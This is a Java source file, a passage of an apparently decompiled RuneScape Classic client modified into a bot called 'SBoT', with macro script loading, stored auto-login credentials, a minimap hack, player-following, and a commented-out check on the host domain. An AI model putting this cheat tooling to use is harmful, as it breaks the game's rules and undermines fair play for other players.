import java.awt.*;
import java.net.*;
import java.io.*;
import java.security.MessageDigest;
import java.util.Properties;
import java.util.zip.ZipFile;
import javax.swing.event.*;
import java.awt.geom.*;
import java.lang.*;
import java.util.*;
import java.awt.event.*;
import java.io.*;
import java.lang.reflect.*;
import java.applet.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.geom.*;
import java.awt.image.*;
import java.io.PrintStream;

public final class mudclient extends Applet_Sub1_Sub1
{
	public String ghosting = null;

	int lastChatter = 0;
	String lastChatterName = "";

	boolean trading = false;
	int tradeinv = -1;

	public static String VERSION = "6.0";
	public int versioncheck = 0;
	public int download = 0;
	public boolean Downloading = false;
	public String CURVERSION = null;
	public String StUpdate = "";

	Script macro;
	static mudclient mudclient1;

	public static Hashtable macros = new Hashtable();
 	
	public boolean ass = false;
	public boolean Running = false;
              public boolean penis = false;
    	public int decworld;
    	public int incworld;

	public boolean CheckFighters = false;

	boolean arrowkeydown = false;
	boolean arrowkeyup = false;
	boolean pgupdown = false;
	boolean pgdowndown = false;
              boolean home = false;
              boolean end = false;

	static boolean disable = false;

	boolean gotnewmessage = false;
	boolean waitingforserver = false;
	String lastservermessage = null;
	String lastchatmessage = null;
	String lastnpcmessage = null;

	static boolean autologin = false;
	static String loginname = null;
	static String loginpass = null;

	int lastplayerattacked = -1;

	int ARROWUP = 1004;
	int ARROWDOWN = 1005; 
	int PGDN = 1003;
	int PGUP = 1002;
	int yrot = 912;
              public int maphax;
	boolean FOW = false;
              int Home = 1001;
              int End = 1000;
	int yb = 24;



	public final synchronized boolean keyDown(Event event, int i)
	{
                if (i == Home)
{               
home = true;
              }
if (i == End)
{
end = true;
}	
	if (i == PGUP)
		{ 
			if (sleeping)
				yb++;
			else
				pgdowndown = true;
		}
		if (i == PGDN)
		{
			if (sleeping)
				yb--;
			else
				pgupdown = true;
		}
		if (i == ARROWUP)
		{
			arrowkeyup = true;
		}
		if (i == ARROWDOWN)
		{
			arrowkeydown = true;
		}
if (i == 1010)
{
penis = !penis;
if (penis)
DisplayMessage("@dre@SBoT: @ora@turned off ", 3);
else
DisplayMessage("@dre@SBoT: @ora@turned on", 3);	
	}
		if (i == 99995)
		{
			loadScripts();
		}
		if (i == 1016)
		{
			if (Running == true)
			{
				DisplayMessage("@gre@SBoT: @whi@Script stopped", 3);
				Running = false;
			} else {
				DisplayMessage("@gre@SBoT: @whi@No script running...", 3);
			}
		}
		if (i == 99999)
			method22();
		if (i == 1018)
			disable = !disable;
		if (i == 1019)
		{
			autologin = !autologin;
			if (autologin)
			{
				loginname = djk;
				loginpass = djl;
				System.out.println("AutoLogin enabled for " + loginname);
				DisplayMessage("@gre@SBoT: @whi@AutoLogin enabled for " + loginname, 3);
			} else {
				System.out.println("AutoLogin disabled");
				DisplayMessage("@gre@SBoT: @whi@AutoLogin disabled", 3);
			}
		}
		if (macro != null)
			macro.KeyPressed(i);
		return super.keyDown(event, i);
	}

	public synchronized boolean keyUp(Event event, int i)
	{
                if (i == Home)
{             
 home = false;
              }
if (i  == End)
{
end = false;
}		
if (i == PGUP)
		{
			pgdowndown = false;
		}
		if (i == PGDN)
		{
			pgupdown = false;
		}
		if (i == ARROWUP)
		{
			arrowkeyup = false;
		}
		if (i == ARROWDOWN)
		{
			arrowkeydown = false;
		}
		if (macro != null)
			macro.KeyReleased(i);
		return super.keyUp(event,i);
	}

	public static boolean ScriptsDone;

	public static void main(String as[])
	{	

		mudclient1 = new mudclient();
		mudclient1.member = true;
		mudclient1.aBoolean979 = false;
		mudclient1.method6(mudclient1.anInt676, mudclient1.anInt677 + 11, "SBoT " + VERSION + " - antiyou", false);
			
			
			loadScripts();

			System.out.println("SBoT201 " + VERSION + " - antiyou");
			System.out.println("<3 Kaitnieks <3 RichyT");

			ScriptsDone = true;

	}

	public static void loadScripts()
	{
		macros.clear();
		File f = new File(System.getProperty("user.dir") + "/Scripts");
		String[] files = f.list();
		for(int i = 0; i < files.length;i++)
		{
			try
			{
				if(files[i].endsWith(".class") && files[i].indexOf('$') == -1)
				{
					Class clazz = Class.forName(files[i].substring(0,files[i].length()-".class".length()));
					Script macro = (Script)clazz.getConstructor(new Class[]{mudclient.class}).newInstance(new Object[]{mudclient1});
					String[] commands = macro.getCommands();
					System.out.println("Script found: " + files[i]);
					for(int j = 0; j < commands.length;j++)
					{
						System.out.println(" - Command: " + commands[j]);
						macros.put(commands[j], macro);
					}
				}
			}
			catch(Exception e)
			{
				e.toString();
			}
		}
	}


public static void loadScripts2()
	{
		macros.clear();
		File f = new File(System.getProperty("user.dir") + "/Scripts");
		String[] files = f.list();
		for(int i = 0; i < files.length;i++)
		{
			try
			{
				if(files[i].endsWith(".class") && files[i].indexOf('$') == -1)
				{
					Class clazz = Class.forName(files[i].substring(0,files[i].length()-".class".length()));
					Script macro = (Script)clazz.getConstructor(new Class[]{mudclient.class}).newInstance(new Object[]{mudclient1});
					String[] commands = macro.getCommands();
					for(int j = 0; j < commands.length;j++)
						macros.put(commands[j], macro);
				}
			}
			catch(Exception e)
			{
				e.toString();
			}
		}
	}	

	public void GetNews()
	{	
		new Thread
		(
			new Runnable()
			{
				public void run()
				{
					try
					{
						String bbbb = "http://www.h4x4phun.com/news.php";
						try
						{
							while (!ScriptsDone)
							{
								try
								{
									Thread.sleep(10);
								}
								catch (InterruptedException e) { e.toString();}
							}
							BufferedReader in = new BufferedReader(new InputStreamReader(new URL(bbbb).openStream()));
							System.out.println("+-- SBOT'S NEWS! --+");
							String line = in.readLine();
							while (line != null)
							{
								System.out.println(line);
								line = in.readLine();
							}
						}
						catch (Exception e) 
						{ 
							e.toString();
						} 
					}
					catch (Exception e)
					{
						e.toString();
					}
				}		
		}).start();
	}

    public mudclient()
    {
        super();

		GetNews();
		Zb = new byte[10200];

        int i = identify.anInt144;
        eea = new boolean[1500];
        anIntArray664 = new int[8];
        anIntArray665 = new int[8];
        aBoolean666 = false;
        aBoolean668 = false;
        aBoolean669 = false;
        tradeSecond = false;
        aBoolean674 = false;
        aBoolean675 = true;
        anInt676 = 512;
        anInt677 = 334;
        anInt678 = 9;
        dia = new boolean[50];
        aBoolean680 = false;
        aString681 = "";
        aString682 = "";
        anInt683 = 550;
        anIntArray686 = new int[99];
        anIntArray687 = new int[50];
        anIntArray688 = new int[50];
        anIntArray689 = new int[50];
        anIntArray692 = new int[14];
        anIntArray693 = new int[14];
        anInt707 = 30;
        inv = new int[35];
        dkb = new int[35];
        isWorn = new int[35];
        anIntArray712 = new int[18];
        aBooleanArray716 = new boolean[50];
        dih = false;
        aBoolean718 = false;
        aBoolean719 = false;
        aBoolean720 = false;
        aBoolean721 = false;
        anIntArray722 = new int[50];
        anIntArray723 = new int[50];
        shop = false;
        curstat = new int[18];
        anInt729 = 128;
        anIntArray730 = new int[50];
        djk = "";
        djl = "";
        ebd = new int[256];
        ebe = new int[256];
        ebf = new int[256];
        doordir = new int[500];
        doortype = new int[500];
        aBoolean745 = false;
        doorx = new int[500];
        doory = new int[500];
        aBoolean757 = false;
        anIntArray758 = new int[50];
        anIntArray759 = new int[50];
        mobx = new int[1500];
        moby = new int[1500];
        mobtype = new int[1500];
        mobid = new int[1500];
        selecteditem = -1;
        selecteditemname = "";
        aBoolean767 = false;
        npc = new Class2[500];
        secondmsg = new String[250];
        itemx = new int[5000];
        itemy = new int[5000];
        itemtype = new int[5000];
        anIntArray773 = new int[5000];
        aStringArray774 = new String[5];
        aClass5Array781 = new Class5[500];
        egl = -1;
        anIntArray787 = new int[8];
        anIntArray788 = new int[8];
        aBoolean789 = false;
        aString794 = "";
        anIntArray797 = new int[5];
        aBoolean801 = false;
        aBoolean802 = false;
        actionid = new int[250];
        actionvar = new int[250];
        actionvar2 = new int[250];
        dhd = -1;
        aBoolean810 = false;
        selectedspell = -1;
        aClass5Array814 = new Class5[1500];
        anIntArray815 = new int[500];
        anIntArray816 = new int[256];
        anIntArray817 = new int[256];
        aStringArray821 = new String[50];
        aClass2Array822 = new Class2[500];
        aString824 = "";
        stat = new int[18];
        djd = new boolean[500];
        anInt834 = -1;
        anInt835 = -2;
        anIntArray837 = new int[14];
        anIntArray838 = new int[14];
        aString848 = "";
        aBoolean849 = false;
        QuestMenu = false;
        aBoolean853 = false;
        aBoolean854 = false;
        tradeFirst = false;
        aString861 = "";
        aString862 = "";
        sleeping = false;
        anInt872 = 1;
        anInt873 = 2;
        anInt874 = 2;
        anInt875 = 8;
        anInt876 = 14;
        anInt878 = 1;
        bank = false;
        dee = true;
        anIntArray881 = new int[50];
        actiontype = new int[250];
        anIntArray887 = new int[14];
        anIntArray888 = new int[14];
        aBoolean890 = false;
        aClass2Array891 = new Class2[4000];
        anInt896 = 2;
        anInt897 = 40;
        ddh = -1;
        anInt904 = -2;
        aBoolean908 = false;
        anIntArray911 = new int[8];
        anIntArray912 = new int[8];
        aStringArray913 = new String[5];
        member = false;
        anInt916 = 48;
        aBoolean917 = false;
        anInt919 = -1;
        anInt920 = -1;
        anInt921 = -1;
        aBoolean922 = false;
        aClass2Array923 = new Class2[500];
        anIntArray934 = new int[50];
        anIntArray935 = new int[5];
        actionx = new int[250];
        actiony = new int[250];
        anInt940 = 1;
        aBoolean944 = false;
        aBoolean945 = false;
        absnpc = 128;
        anIntArray955 = new int[256];
        anIntArray956 = new int[256];
        aClass2Array957 = new Class2[5000];
        anIntArray960 = new int[8];
        anIntArray961 = new int[8];
        anIntArray962 = new int[8000];
        anIntArray963 = new int[8000];
        anIntArray965 = new int[50];
        anIntArray966 = new int[50];
        anIntArray967 = new int[50];
        anIntArray968 = new int[50];
        tradeType = new int[14];
        tradeCount = new int[14];
        anIntArray972 = new int[50];
        anInt974 = 2;
        myplayer = new Class2();
        anInt978 = -1;
        aBoolean979 = true;
        anIntArray981 = new int[8192];
        anIntArray982 = new int[8192];
        player = new Class2[500];
        anIntArray984 = new int[250];
        firstmsg = new String[250];
        aBoolean992 = false;
        aClass5Array994 = new Class5[1000];
        anInt995 = 0xbc614e;
    }

    public final Image createImage(int i, int j)
    {
        if(Applet_Sub1.aFrame_Sub1_7 != null)
            return Applet_Sub1.aFrame_Sub1_7.createImage(i, j);
        if(Class8.anApplet370 != null)
            return Class8.anApplet370.createImage(i, j);
        else
            return super.createImage(i, j);
    }

    public URL getCodeBase()
    {
		try
		{
			return new URL(ServerList.getWorld());
		}
		catch (MalformedURLException e) { e.toString();}
		return null;
    }

    public final URL getDocumentBase()
    {
        if(Class8.anApplet370 != null)
            return Class8.anApplet370.getDocumentBase();
        else
            return super.getDocumentBase();
    }

    public final Graphics getGraphics()
    {
        if(Applet_Sub1.aFrame_Sub1_7 != null)
            return Applet_Sub1.aFrame_Sub1_7.getGraphics();
        if(Class8.anApplet370 != null)
            return Class8.anApplet370.getGraphics();
        else
            return super.getGraphics();
    }

    public final String getParameter(String s)
    {
        if(Class8.anApplet370 != null)
            return Class8.anApplet370.getParameter(s);
        else
            return super.getParameter(s);
    }

    protected final void method1()
    {
        if(aBoolean979)
        {
            String s = getDocumentBase().getHost().toLowerCase();
            //if(!s.endsWith("jagex.com") && !s.endsWith("jagex.co.uk") && !s.endsWith("runescape.com") && !s.endsWith("runescape.co.uk") && !s.endsWith("runescape.net") && !s.endsWith("runescape.org") && !s.endsWith("penguin") && !s.endsWith("puffin"))
            //{
            //    aBoolean666 = true;
            //    return;
            //}
        }
        int i = 0;
        for(int j = 0; j < 99; j++)
        {
            int k = j + 1;
            int i1 = (int)((double)k + 300D * Math.pow(2D, (double)k / 7D));
            i += i1;
            anIntArray686[j] = i & 0xffffffc;
        }

        try
        {
            String s1 = getParameter("referid");
            anInt731 = Integer.parseInt(s1);
        }
        catch(Exception _ex) {_ex.toString(); }
        try
        {
            String s2 = getParameter("member");
            int j1 = Integer.parseInt(s2);
            if(j1 == 1)
                member = true;
        }
        catch(Exception _ex) {_ex.toString(); }
        super.anInt11 = 0;
        Applet_Sub1_Sub1.anInt615 = 1000;
        Applet_Sub1_Sub1.anInt614 = Class18.anInt573;
        try
        {
            super.gamePort = ServerList.getPort();
        }
        catch(Exception _ex) {_ex.toString(); }
        method73();
        if(aBoolean922)
            return;
        anInt948 = 2000;
        anInt949 = anInt948 + 100;
        anInt950 = anInt949 + 50;
        anInt954 = anInt950 + 1000;
        anInt951 = anInt954 + 10;
        anInt952 = anInt951 + 50;
        anInt953 = anInt952 + 10;
        aGraphics857 = getGraphics();
        method8(50);
        gfx = new Class6_Sub1(anInt676, anInt677 + 12, 4000, this);
        gfx.aMudclient641 = this;
        gfx.method209(0, 0, anInt676, anInt677 + 12);
        Class4.aBoolean220 = false;
        Class4.anInt221 = anInt949;
        aClass4_798 = new Class4(gfx, 5);
        int l = ((Class6) (gfx)).anInt311 - 199;
        byte byte0 = 36;
        anInt799 = aClass4_798.method163(l, byte0 + 24, 196, 90, 1, 500, true);
        aClass4_925 = new Class4(gfx, 5);
        anInt926 = aClass4_925.method163(l, byte0 + 40, 196, 126, 1, 500, true);
        aClass4_826 = new Class4(gfx, 5);
        anInt827 = aClass4_826.method163(l, byte0 + 24, 196, 251, 1, 500, true);
        method121();
        if(aBoolean922)
            return;
        method86();
        if(aBoolean922)
            return;
        aClass10_739 = new Class10(gfx, 35000, 35000, 1000);
        aClass10_739.method281(anInt676 / 2, anInt677 / 2, anInt676 / 2, anInt677 / 2, anInt676, anInt678);
        aClass10_739.anInt390 = 2400;
        aClass10_739.anInt391 = 2400;
        aClass10_739.anInt392 = 1;
        aClass10_739.anInt393 = 2300;
        aClass10_739.method309(-50, -10, -50);
        efh = new Class19(aClass10_739, gfx);
        efh.anInt589 = anInt948;
        method113();
        if(aBoolean922)
            return;
        method64();
        if(aBoolean922)
            return;
        method95();
        if(aBoolean922)
            return;
        if(member)
            method102();
        if(aBoolean922)
        {
            return;
        } else
        {
            method15(100, "Starting game...");
            method94();
            fej();
            method59();
            method50();
            method5();
            method77();
            return;
        }
    }

    protected final void method10(int i)
    {    
if(ehc == 0)
        {
            if(anInt690 == 0)
                elj.method141(i);
            if(anInt690 == 1)
                aClass4_667.method141(i);
            if(anInt690 == 2)
                aClass4_751.method141(i);
        }
        if(ehc == 1)
        {
            if(aBoolean992)
            {
                aClass4_830.method141(i);
                return;
            }
            if(anInt931 == 0 && anInt986 == 0 && !sleeping)
                aClass4_775.method141(i);
        }
    }

    public final void method100()
    {
        int l = identify.anInt144;
        byte byte0 = 22;
        byte byte1 = 36;
        gfx.method216(byte0, byte1, 468, 16, 192);
        int i = 0x989898;
        gfx.method214(byte0, byte1 + 16, 468, 246, i, 160);
        gfx.drawString("Please confirm your duel with @yel@" + fnf.method363(aLong907), byte0 + 234, byte1 + 12, 1, 0xffffff);
        gfx.drawString("Your stake:", byte0 + 117, byte1 + 30, 1, 0xffff00);
        for(int j = 0; j < anInt663; j++)
        {
            String s = identify.itemName[anIntArray664[j]];
            if(identify.ahl[anIntArray664[j]] == 0)
                s = s + " x " + method48(anIntArray665[j]);
            gfx.drawString(s, byte0 + 117, byte1 + 42 + j * 12, 1, 0xffffff);
        }

        if(anInt663 == 0)
            gfx.drawString("Nothing!", byte0 + 117, byte1 + 42, 1, 0xffffff);
        gfx.drawString("Your opponent's stake:", byte0 + 351, byte1 + 30, 1, 0xffff00);
        for(int k = 0; k < anInt786; k++)
        {
            String s1 = identify.itemName[anIntArray787[k]];
            if(identify.ahl[anIntArray787[k]] == 0)
                s1 = s1 + " x " + method48(anIntArray788[k]);
            gfx.drawString(s1, byte0 + 351, byte1 + 42 + k * 12, 1, 0xffffff);
        }

        if(anInt786 == 0)
            gfx.drawString("Nothing!", byte0 + 351, byte1 + 42, 1, 0xffffff);
        if(anInt988 == 0)
            gfx.drawString("You can retreat from this duel", byte0 + 234, byte1 + 180, 1, 65280);
        else
            gfx.drawString("No retreat is possible!", byte0 + 234, byte1 + 180, 1, 0xff0000);
        if(anInt989 == 0)
            gfx.drawString("Magic may be used", byte0 + 234, byte1 + 192, 1, 65280);
        else
            gfx.drawString("Magic cannot be used", byte0 + 234, byte1 + 192, 1, 0xff0000);
        if(anInt990 == 0)
            gfx.drawString("Prayer may be used", byte0 + 234, byte1 + 204, 1, 65280);
        else
            gfx.drawString("Prayer cannot be used", byte0 + 234, byte1 + 204, 1, 0xff0000);
        if(anInt991 == 0)
            gfx.drawString("Weapons may be used", byte0 + 234, byte1 + 216, 1, 65280);
        else
            gfx.drawString("Weapons cannot be used", byte0 + 234, byte1 + 216, 1, 0xff0000);
        gfx.drawString("If you are sure click 'Accept' to begin the duel", byte0 + 234, byte1 + 230, 1, 0xffffff);
        if(!aBoolean802)
        {
            gfx.method231((byte0 + 118) - 35, byte1 + 238, anInt948 + 25);
            gfx.method231((byte0 + 352) - 35, byte1 + 238, anInt948 + 26);
        } else
        {
            gfx.drawString("Waiting for other player...", byte0 + 234, byte1 + 250, 1, 0xffff00);
        }
        if(anInt813 == 1)
        {
            if(super.anInt33 < byte0 || super.anInt34 < byte1 || super.anInt33 > byte0 + 468 || super.anInt34 > byte1 + 262)
            {
                aBoolean801 = false;
                super.packets.id(27);
                super.packets.send();
            }
            if(super.anInt33 >= (byte0 + 118) - 35 && super.anInt33 <= byte0 + 118 + 70 && super.anInt34 >= byte1 + 238 && super.anInt34 <= byte1 + 238 + 21)
            {
                aBoolean802 = true;
                super.packets.id(175);
                super.packets.send();
            }
            if(super.anInt33 >= (byte0 + 352) - 35 && super.anInt33 <= byte0 + 353 + 70 && super.anInt34 >= byte1 + 238 && super.anInt34 <= byte1 + 238 + 21)
            {
                aBoolean801 = false;
                super.packets.id(43);
                super.packets.send();
            }
            anInt813 = 0;
        }
    }

    public final void method101()
    {
        int j5 = identify.anInt144;
        for(int i = 0; i < anInt820; i++)
        {
            int j = gfx.method261(1);
            int l = anIntArray965[i];
            int k1 = anIntArray966[i];
            int j2 = anIntArray967[i];
            int i3 = anIntArray968[i];
            boolean flag = true;
            while(flag) 
            {
                flag = false;
                for(int i4 = 0; i4 < i; i4++)
                    if(k1 + i3 > anIntArray966[i4] - j && k1 - j < anIntArray966[i4] + anIntArray968[i4] && l - j2 < anIntArray965[i4] + anIntArray967[i4] && l + j2 > anIntArray965[i4] - anIntArray967[i4] && anIntArray966[i4] - j - i3 < k1)
                    {
                        k1 = anIntArray966[i4] - j - i3;
                        flag = true;
                    }

            }
            anIntArray966[i] = k1;
            gfx.method256(aStringArray821[i], l, k1, 1, 0xffff00, 300);
        }

        for(int k = 0; k < anInt958; k++)
        {
            int i1 = anIntArray758[k];
            int l1 = anIntArray759[k];
            int k2 = anIntArray722[k];
            int j3 = anIntArray723[k];
            int l3 = (39 * k2) / 100;
            int j4 = (27 * k2) / 100;
            int k4 = l1 - j4;
            gfx.method234(i1 - l3 / 2, k4, l3, j4, anInt948 + 9, 85);
            int l4 = (36 * k2) / 100;
            int i5 = (24 * k2) / 100;
            gfx.method247(i1 - l4 / 2, (k4 + j4 / 2) - i5 / 2, l4, i5, identify.anIntArray53[j3] + anInt950, identify.anIntArray58[j3], 0, 0, false);
        }

        for(int j1 = 0; j1 < anInt766; j1++)
        {
            int i2 = anIntArray687[j1];
            int l2 = anIntArray688[j1];
            int k3 = anIntArray689[j1];
            gfx.method214(i2 - 15, l2 - 3, k3, 5, 65280, 192);
            gfx.method214((i2 - 15) + k3, l2 - 3, 30 - k3, 5, 0xff0000, 192);
        }

    }

    public final void method102()
    {
        try
        {
            aByteArray987 = method18("sounds" + Class18.anInt580 + ".mem", "Sound effects", 90);
            anInputStream_Sub1_901 = new InputStream_Sub1();
            return;
        }
        catch(Throwable throwable)
        {
			throwable.toString();
            System.out.println("Unable to init sounds:" + throwable);
        }
    }

    public final void method103(boolean flag)
    {
        int l8 = identify.anInt144;
        int i = ((Class6) (gfx)).anInt311 - 199;
        char c = '\234';
        char c2 = '\230';
        gfx.method231(i - 49, 3, anInt948 + 2);
        i += 40;
        gfx.method216(i, 36, c, c2, 0);
        gfx.method209(i, 36, i + c, 36 + c2);
        int k = 192 + maphax;
        int i1 = anInt729 + anInt859 & 0xff;
        int k1 = ((myplayer.x - 6040) * 3 * k) / 2048;
        int i3 = ((myplayer.y - 6040) * 3 * k) / 2048;
        int k4 = Class10.anIntArray394[1024 - i1 * 4 & 0x3ff];
        int i5 = Class10.anIntArray394[(1024 - i1 * 4 & 0x3ff) + 1024];
        int k5 = i3 * k4 + k1 * i5 >> 18;
        i3 = i3 * i5 - k1 * k4 >> 18;
        k1 = k5;
        gfx.method243((i + c / 2) - k1, 36 + c2 / 2 + i3, anInt948 - 1, i1 + 64 & 0xff, k);
        for(int i7 = 0; i7 < mobCount; i7++)
        {
            int l1 = (((mobx[i7] * absnpc + 64) - myplayer.x) * 3 * k) / 2048;
            int j3 = (((moby[i7] * absnpc + 64) - myplayer.y) * 3 * k) / 2048;
            int l5 = j3 * k4 + l1 * i5 >> 18;
            j3 = j3 * i5 - l1 * k4 >> 18;
            l1 = l5;
            method74(i + c / 2 + l1, (36 + c2 / 2) - j3, 65535);
        }

        for(int j7 = 0; j7 < itemCount; j7++)
        {
            int i2 = (((itemx[j7] * absnpc + 64) - myplayer.x) * 3 * k) / 2048;
            int k3 = (((itemy[j7] * absnpc + 64) - myplayer.y) * 3 * k) / 2048;
            int i6 = k3 * k4 + i2 * i5 >> 18;
            k3 = k3 * i5 - i2 * k4 >> 18;
            i2 = i6;
            method74(i + c / 2 + i2, (36 + c2 / 2) - k3, 0xff0000);
        }

        for(int k7 = 0; k7 < npcCount; k7++)
        {
            Class2 class2 = npc[k7];
            int j2 = ((class2.x - myplayer.x) * 3 * k) / 2048;
            int l3 = ((class2.y - myplayer.y) * 3 * k) / 2048;
            int j6 = l3 * k4 + j2 * i5 >> 18;
            l3 = l3 * i5 - j2 * k4 >> 18;
            j2 = j6;
            method74(i + c / 2 + j2, (36 + c2 / 2) - l3, 0xffff00);
        }

        for(int l7 = 0; l7 < playerCount; l7++)
        {
            Class2 class2_1 = player[l7];
            int k2 = ((class2_1.x - myplayer.x) * 3 * k) / 2048;
            int i4 = ((class2_1.y - myplayer.y) * 3 * k) / 2048;
            int k6 = i4 * k4 + k2 * i5 >> 18;
            i4 = i4 * i5 - k2 * k4 >> 18;
            k2 = k6;
            int j8 = 0xffffff;
            for(int k8 = 0; k8 < super.anInt624; k8++)
            {
                if(class2_1.aLong145 != super.aLongArray625[k8] || super.anIntArray626[k8] != 99)
                    continue;
                j8 = 65280;
                break;
            }

            method74(i + c / 2 + k2, (36 + c2 / 2) - i4, j8);
        }

        gfx.method213(i + c / 2, 36 + c2 / 2, 2, 0xffffff, 255);
        gfx.method243(i + 19, 55, anInt948 + 24, anInt729 + 128 & 0xff, 128);
        gfx.method209(0, 0, anInt676, anInt677 + 12);
        if(!flag)
            return;
        i = super.anInt33 - (((Class6) (gfx)).anInt311 - 199);
        int i8 = super.anInt34 - 36;
        if(i >= 40 && i8 >= 0 && i < 196 && i8 < 152)
        {
            char c1 = '\234';
            char c3 = '\230';
            int l = 192 + maphax;
            int j1 = anInt729 + anInt859 & 0xff;
            int j = ((Class6) (gfx)).anInt311 - 199;
            j += 40;
            int l2 = ((super.anInt33 - (j + c1 / 2)) * 16384) / (3 * l);
            int j4 = ((super.anInt34 - (36 + c3 / 2)) * 16384) / (3 * l);
            int l4 = Class10.anIntArray394[1024 - j1 * 4 & 0x3ff];
            int j5 = Class10.anIntArray394[(1024 - j1 * 4 & 0x3ff) + 1024];
            int l6 = j4 * l4 + l2 * j5 >> 15;
            j4 = j4 * j5 - l2 * l4 >> 15;
            l2 = l6;
            l2 += myplayer.x;
            j4 = myplayer.y - j4;
            if(anInt813 == 1)
                fdl(smallx, smally, l2 / 128, j4 / 128, false);
            anInt813 = 0;
        }
    }

    public final boolean method104(int i, int j)
    {
        if(i == 31 && (method79(197) || method79(615) || method79(682)))
            return true;
        if(i == 32 && (method79(102) || method79(616) || method79(683)))
            return true;
        if(i == 33 && (method79(101) || method79(617) || method79(684)))
            return true;
        if(i == 34 && (method79(103) || method79(618) || method79(685)))
            return true;
        return InvCount(i) >= j;
    }

    public final void enn(int i, int j, int k, int l)
    {
        int i1;
        int j1;
        if(k == 0 || k == 4)
        {
            i1 = identify.anIntArray63[l];
            j1 = identify.anIntArray64[l];
        } else
        {
            j1 = identify.anIntArray63[l];
            i1 = identify.anIntArray64[l];
        }
        if(identify.anIntArray65[l] == 2 || identify.anIntArray65[l] == 3)
        {
            if(k == 0)
            {
                i--;
                i1++;
            }
            if(k == 2)
                j1++;
            if(k == 4)
                i1++;
            if(k == 6)
            {
                j--;
                j1++;
            }
            method83(smallx, smally, i, j, (i + i1) - 1, (j + j1) - 1, false, true);
            return;
        } else
        {
            method83(smallx, smally, i, j, (i + i1) - 1, (j + j1) - 1, true, true);
            return;
        }
    }

    public final Class5 method106(int i, int j, int k, int l, int i1)
    {
        int j1 = i;
        int k1 = j;
        int l1 = i;
        int i2 = j;
        int j2 = identify.anIntArray79[l];
        int k2 = identify.anIntArray80[l];
        int l2 = identify.anIntArray78[l];
        Class5 class5 = new Class5(4, 1);
        if(k == 0)
            l1 = i + 1;
        if(k == 1)
            i2 = j + 1;
        if(k == 2)
        {
            j1 = i + 1;
            i2 = j + 1;
        }
        if(k == 3)
        {
            l1 = i + 1;
            i2 = j + 1;
        }
        j1 *= absnpc;
        k1 *= absnpc;
        l1 *= absnpc;
        i2 *= absnpc;
        int i3 = class5.method180(j1, -efh.method421(j1, k1), k1);
        int j3 = class5.method180(j1, -efh.method421(j1, k1) - l2, k1);
        int k3 = class5.method180(l1, -efh.method421(l1, i2) - l2, i2);
        int l3 = class5.method180(l1, -efh.method421(l1, i2), i2);
        int ai[] = {
            i3, j3, k3, l3
        };
        class5.method182(4, ai, j2, k2);
        class5.method185(false, 60, 24, -50, -10, -50);
        if(i >= 0 && j >= 0 && i < 96 && j < 96)
            aClass10_739.method269(class5);
        class5.anInt257 = i1 + 10000;
        return class5;
    }

    public final Class2 method107(int i, int j, int k, int l, int i1)
    {
        int l1 = identify.anInt144;
        if(aClass2Array957[i] == null)
        {
            aClass2Array957[i] = new Class2();
            aClass2Array957[i].id = i;
        }
        Class2 class2 = aClass2Array957[i];
        boolean flag = false;
        for(int j1 = 0; j1 < anInt906; j1++)
        {
            if(aClass2Array822[j1].id != i)
                continue;
            flag = true;
            break;
        }

        if(flag)
        {
            class2.type = i1;
            class2.anInt154 = l;
            int k1 = class2.anInt156;
            if(j != class2.anIntArray157[k1] || k != class2.anIntArray158[k1])
            {
                class2.anInt156 = k1 = (k1 + 1) % 10;
                class2.anIntArray157[k1] = j;
                class2.anIntArray158[k1] = k;
            }
        } else
        {
            class2.id = i;
            class2.anInt155 = 0;
            class2.anInt156 = 0;
            class2.anIntArray157[0] = class2.x = j;
            class2.anIntArray158[0] = class2.y = k;
            class2.type = i1;
            class2.anInt154 = class2.hah = l;
            class2.anInt152 = 0;
        }
        npc[npcCount++] = class2;
        return class2;
    }

	public int ghostingPlayerY()
	{
		if (ghosting != null)
			if (PlayerY(PlayerByName(ghosting)) != -1)
				return player[playerfromid(PlayerByName(ghosting))].y;
			else
				ghosting = null;
		return myplayer.y;
	}

	public int ghostingPlayerX()
	{
		if (ghosting != null)
			if (PlayerX(PlayerByName(ghosting)) != -1)
				return player[playerfromid(PlayerByName(ghosting))].x;
			else
				ghosting = null;
		return myplayer.x;
	}

    public final void method108()
    {
        int l10 = identify.anInt144;
        if(enb != 0)
        {
            gfx.fade();
            gfx.drawString("Oh dear! You are dead...", anInt676 / 2, anInt677 / 2, 7, 0xff0000);
            method69();
            gfx.method211(aGraphics857, 0, 0);
            return;
        }
        if(aBoolean992)
        {
            method61();
            return;
        }
        if(sleeping)
        {
            gfx.fade();
            if(Math.random() < 0.14999999999999999D)
                gfx.drawString("ZZZ", (int)(Math.random() * 80D), (int)(Math.random() * 334D), 5, (int)(Math.random() * 16777215D));
            if(Math.random() < 0.14999999999999999D)
                gfx.drawString("ZZZ", 512 - (int)(Math.random() * 80D), (int)(Math.random() * 334D), 5, (int)(Math.random() * 16777215D));
            gfx.method216(anInt676 / 2 - 100, 160, 200, 40, 0);
            gfx.drawString("You are sleeping", anInt676 / 2, 50, 7, 0xffff00);
            gfx.drawString("Fatigue: " + (tfatigue * 100) / 750 + "%", anInt676 / 2, 90, 7, 0xffff00);
            gfx.drawString("When you want to wake up just use your", anInt676 / 2, 140, 5, 0xffffff);
            gfx.drawString("keyboard to type the word in the box below", anInt676 / 2, 160, 5, 0xffffff);
            gfx.drawString(super.fln + "*", anInt676 / 2, 180, 5, 65535);
            if(ejk == null)
                gfx.method231(anInt676 / 2 - 127, 230, anInt952 + 1);
            else
                gfx.drawString(ejk, anInt676 / 2, 260, 5, 0xff0000);
            gfx.method217(anInt676 / 2 - 128, 229, 257, 42, 0xffffff);
            method69();
            gfx.drawString("If you can't read the word", anInt676 / 2, 290, 1, 0xffffff);
            gfx.drawString("@yel@click here@whi@ to get a different one", anInt676 / 2, 305, 1, 0xffffff);
            gfx.method211(aGraphics857, 0, -24);
            return;
        }
        if(!efh.gjj)
            return;
		

        for(int i = 0; i < 64; i++)
        {
            aClass10_739.method270(efh.aClass5ArrayArray603[dhd][i]);
            if(dhd == 0)
            {
                aClass10_739.method270(efh.aClass5ArrayArray605[1][i]);
                aClass10_739.method270(efh.aClass5ArrayArray603[1][i]);
                aClass10_739.method270(efh.aClass5ArrayArray605[2][i]);
                aClass10_739.method270(efh.aClass5ArrayArray603[2][i]);
            }
            aBoolean789 = false;
            if(dhd == 0 && (efh.anIntArrayArray608[myplayer.x / 128][myplayer.y / 128] & 0x80) == 0)
            {
                aClass10_739.method269(efh.aClass5ArrayArray603[dhd][i]);
                if(dhd == 0)
                {
